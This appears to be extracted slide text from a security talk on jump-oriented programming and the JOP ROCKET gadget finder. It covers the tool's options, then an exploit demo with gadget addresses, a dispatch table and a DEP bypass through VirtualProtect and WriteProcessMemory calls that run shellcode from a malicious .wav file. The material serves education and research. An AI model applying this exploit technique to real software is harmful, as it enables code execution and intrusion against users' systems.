gadgets.
•
E.g. functionally equivalent NOPs.
–
No disassembly stored at any time, just bookkeeping 
data.
–
Not really important as far as doing JOP, but a different 
way to address this programmatically.
–
Tremendous flexibility, numerous options for how JOP 
gadgets are generated.
–
Customization to change how they are found.
•
Can expand or narrow results found.
–
Data would not be organized/classified.
–
No opcode-splitting→not enough JOP. SORRY!
–
Time consuming, tedious, boring, AWFUL.
–
Obtain all possible results for different operations 
based on reasonable default.
–
Print to .csv # of gadgets for each category, making 
easier to see if JOP is feasible for binary.
JOP ROCKET - HOW TO USE IT
•
Static analysis tool run on the command line.
–
Optimized for Cygwin.
–
Can run on any platform that supports Linux with 
dependencies, though limited outside Windows.
•
Provide binary as command line argument
–
python prog.py paint.exe
•
Will provide output for offsets -- convenient for 
ASLR bypasses.
•
JOP ROCKET Options:
–
f: Change PE file being analyzed
–
r: Specify target 32-bit registers, delimited by commas. 
E.g. EAX, EBX, ECX
–
t: Set control flow, e.g. JMP, CALL, ALL
–
p: Print, e.g. ALL, all by REG, by operation
–
d: Get dispatcher gadgets, e.g. by REG or ALL
–
D: Set level of depth for dispatcher gadgets.
–
m: Extract the modules for specified registers.
–
n: Change number of opcodes to disassemble
–
l: Change lines to go back when searching for 
dispatcher gadget.
–
s: Scope--look only within the executable or executable 
and all modules
–
g: Get gadgets; this acquires all gadgets ending in 
specified registers.
–
G: Get dispatcher gadgets; this acquires all gadgets 
ending in specified registers. 
–
c: Clears everything.
–
k: Clears selected DLLs.
–
x: exit.
You can download the JOP ROCKET from Github:
https://github.com/Bw3ll/JOP_ROCKET
JOP ROCKET - HOW TO USE IT
– Establish registers of interest to 
search for
•
e.g. EAX, EBX, All
– Establish scope - do you want JMP,  
CALL, or both?
•
e.g. CALL EAX, JMP EAX
– Are you looking at modules/dlls?
•
If so, it must extract those.
– Once selections are made, type g for 
go, and it will obtain and classify all 
JOP gadgets
– Print results to terminal and file.
•
There are numerous areas of 
classification, based also upon registers 
selected.
–
This allows you to be very granular and 
specific about needs. 
•
E.g. seeking an operation that performs 
addition on EDX
•
Selected desired operations to print.
–
Can select ALL, recommended, different 
categories (e.g. POP, PUSH).
– Can select everything and print out 
total numbers of gadgets as a CSV.
•
Useful to see if enough gadgets to be 
worth spending too much time with.
–
Sometimes there just won’t be enough.
JOP ROCKET - HOW TO USE IT
– To find dispatcher gadgets, must first 
select registers to be searched for.
– Next, select registers used for dispatcher 
gadgets.
– Select appropriate option under printing 
sub-menu to get dispatcher gadgets.
– Reminder: dispatcher gadgets are fairly 
scarce, so you may have to make do with 
what’s available.
– If not enough or none found, you can 
increase the depth.
– Call keeps pushing return address to 
stack.
– If using stack to load parameters for 
Windows API calls, need to make 
frequent stack adjustments.
•
Likely not feasible with most.
– May need to use other area of memory 
under control to set up parameters, and 
then do stack pivot prior to calling the 
Windows API.
•
Gadgets may not be there to support it. 
–
If so, use JOP ROCKET and try to think 
creatively.
A COUPLE SCREENSHOTS
NOW ONTO A JOP EXPLOIT 
DEMO
•
Let the fun begin.
•
Let’s walk through some of the finer 
points, so we can understand how it 
works in practice.
•
We have two points of control here, an overflow in a string resulting in control 
over EIP, and the file supplied which gets written to memory.
•
Flow of execution for the exploit:
>enter input: 
AAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAA…
SUB ESP,0x4f;
POP EAX;
. . .
JMP EDX;
.wav file header
. . .
VirtualProtect() 
JOP Chain
. . .
. . .
WriteProcessMemory()
JOP Chain
. . .
. . .
1. Initial overflow
2. JOP Setup Gadget
3. JOP chains in malicious .wav 
4. NOP sled + Shellcode
EXPLOIT DIAGRAM
This gadget put the Dispatcher address in EDX, and 
the Table address in EDI, making JOP possible.
You can download the JOP ROCKET from Github:
https://github.com/Bw3ll/JOP_ROCKET
A LOOK AT SOME JOP SPECIFICS
Register holding dispatcher address:
EDX
Register holding dispatch table address:
EDI
Dispatcher gadget instructions:
ADD EDI,0xC; JMP DWORD PTR [EDI];
ESP location during main JOP chains:
628 bytes after the beginning of the .wav 
file in memory (0x00436628)
JOP MECHANICS
Dispatch table 
Address
Value
0x00436038
ED 17 40 00
0x0043603C
41 41 41 41
0x00436040
41 41 41 41
0x00436044
E6 15 40 00
0x00436048
41 41 41 41
0x0043604C
41 41 41 41
0x00436050
E6 15 40 00
0x00436054
41 41 41 41
0x00436058
41 41 41 41
0x0043605C
61 15 40 00
Dispatcher Gadget
Address:
0x00401538
ADD EDI,0xC;
JMP DWORD PTR [EDI];
Functional Gadgets
Address
Instruction
0x00401561
MOV ECX,0x0552A200;
. . .
MOV EBX,0x40204020;
. . .
JMP EDX;
. . .
. . .
0x004015E6
ADD ESP, 0x894;
. . .
MOV EBP,ESP;
. . .
JMP EDX;
. . .
. . .
0x004016ED
MOV ESP,0x00435500;
. . . 
JMP EDX;
SETTING THINGS UP
•
Initial overflow directs execution to the setup gadget (below).
•
Allows us to put the dispatcher address into EDX and the table address into EDI.
•
CALL EDX directs flow to dispatcher. Everything after adheres to dispatch table.
• .
0x004016ED
MOV ESP,0x00435500 # JMP EDX
0x00401642
SUB ESP,0x4f # POP EAX # POP EDX # POP EDI
XOR EDX,EAX # XOR EDI,EAX # CALL EDX
XORs allow us to get to values 
containing null bytes without 
supplying null bytes ourselves.
SUB ESP moves ESP into our buffer so we can supply values.
•
Before we start crafting function calls, let’s move ESP.
•
ESP is moved to a location in memory where the .wav file is written
Pretty close… file starts at 0x00436000.
0x004015E6
ADD ESP, 0x894 # MOV EBP,ESP # JMP EDX
ESP = 0x00435D94, one more should do it.
0x004015E6
ADD ESP, 0x894 # MOV EBP,ESP # JMP EDX
ESP = 0x00436628, 628 bytes after 
the start of the file in memory.
CALLING FUNCTIONS WITH JOP
•
Used to create a section of RWX memory to write shellcode to and execute it from.
•
This violates the core principle behind DEP. 
Items Pushed, in Order
Formal Name
Value Pushed
Descripton
Return Address
0x004015F0
Return to next gadget in 
chain
lpfOldProtect
0x00461000
A writable location
flNewProtect
0x40
Choose RWX protections
dwSize
0xF000
How much memory to 
change
lpAddress
0x00427000
Address of memory to change
Pointer to Function
0x7647432F
Used to call function
CALLING FUNCTIONS WITH JOP
•
Used to copy the shellcode from our malicious file to the RWX memory created by 
VirtualProtect().
Items Pushed, in Order
Formal Name
Value Pushed
Descripton
Return Address
0x00432128
Return to freshly written 
shellcode
lpNumberOfBytesWritten
0x00461000
A writable location
nSize
0x240
Number of bytes to write
lpBuffer
0x004369FC
Location of bytes to copy from
lpBaseAddress
0x00432128
Address to write to
hProcess
0xFFFFFFFF
Handle to current process
Pointer to Function
0x7648D9A8
Used to call function
SUPPLYING VALUES FOR FUNCTIONS
•
ESP doesn’t move much after the very start of the exploit. Only slight 
adjustments are needed to PUSH and POP at the right locations.
•
Afterwards, this series of gadgets is used repeatedly:
•
Allows us to PUSH two of our needed values for a function call.
•
ESP is adjusted as needed in later uses
•
A single gadget is used at the start of the chain for each function to set 
ECX to an arbitrary value. 
•
Specific value isn’t important – just the fact that we know what value it is.
0x004015D5
SUB ESP,0x8 # JMP EDX
0x00401591
PUSH EAX # PUSH ECX #  …  # JMP EDX
0x00401561
MOV ECX,0x0552A200 # … # JMP EDX
0x00401544
… # POP EAX # … # JMP EDX
0x00401544
… # POP EAX # … # JMP EDX
0x00401572
… # XOR ECX, EAX # … # JMP EDX
0x00401591
PUSH EAX # PUSH ECX # … # JMP EDX
1
2
3
4
SOME NUANCES
•
Dereferencing VirtualProtect() Pointer
•
Within memory is a pointer to the VirtualProtect() address. This pointer is always at the same location: 0x00427008. 
•
Here ECX contains the pointer (0x00427008). Dereferencing this pointer gives us the real VirtualProtect() address.
•
Fixing EDX After VirtualProtect() Call
•
VirtualProtect() changes EDX, making it no longer contain the dispatcher address.
•
This gadget can be used to POP the address back into EDX.
•
CALL-ing a Friend
•
You can use gadgets ending in CALL  as well! Just account for the 
return address the CALL instruction will push.
0x004015DF
… # MOV ECX, DWORD PTR [ECX] # JMP EDX
0x004015F0
POP EDX # … # RET
This gadget is ROP rather than JOP. Just make sure you place the dispatcher 
address in the .wav file and RET to it. ROP it and JOP it ☺
0x00401733
… # POP EAX # CALL EDX
0x004015D0
ADD ESP,0x4 # JMP EDX
A return address is pushed automatically with CALL
Just move ESP back where it was.
This gadget dereferences 0x00427008. As a result, 
0x7647432F is left in ECX, which is the real VirtualProtect() 
address.
A COUPLE MORE NUANCES
•
Getting the address to WriteProcessMemory()
•
Unlike VirtualProtect(), the binary doesn’t have a direct pointer to WriteProcessMemory().
•
However, both functions are found in the same DLL. 
•
We can get to WriteProcessMemory() by manually analyzing the DLL and finding an offset to 
add to the VirtualProtect() address.
•
JMP to a Different Register
•
If you need a specific gadget, but it JMPs or CALLs to the wrong register, why not put the 
Dispatcher address in that register than use it anyways?
0x00401544
… # POP EAX # JMP EDX
At this point in the chain, ECX already contains the dereferenced VirtualProtect() address.
0x00401604
MOV EBX,EAX # ADD EBX,ECX # JMP EDX
Putting the offset into EAX
Offset gets added to VirtualProtect() address, so it 
becomes WriteProcessMemory() address.
0x00401695
MOV EAX,EDX # … # JMP EDX
0x0040159E
… # PUSH EBX # JMP EAX
AND NOW TIME FOR THE DEMO?
1.
Take a ROCKET ride.
2.
JOP it.
3.
Profit.
4.
Joy?
THANK YOU!